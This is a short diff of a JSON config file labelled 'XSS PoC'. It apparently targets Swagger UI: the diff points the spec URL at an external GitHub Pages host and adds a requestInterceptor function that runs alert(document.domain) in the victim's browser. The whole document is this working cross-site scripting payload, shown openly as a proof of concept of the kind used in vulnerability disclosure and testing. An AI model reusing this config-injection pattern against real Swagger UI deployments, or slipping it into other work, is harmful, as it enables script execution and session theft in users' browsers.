@@ -1,4 +1,9 @@
 {
-  "urls": [{ "url": "/api/swagger.json", "name": "XSS PoC" }],
-  "RequestInterceptorFunction": "function() { alert(document.domain) }"
+  "urls": [
+    {
+      "url": "https://justluthra.github.io/justluthra/swagger.json",
+      "name": "XSS PoC"
+    }
+  ],
+  "requestInterceptor": "function(request) { alert(document.domain); return request; }"
 }
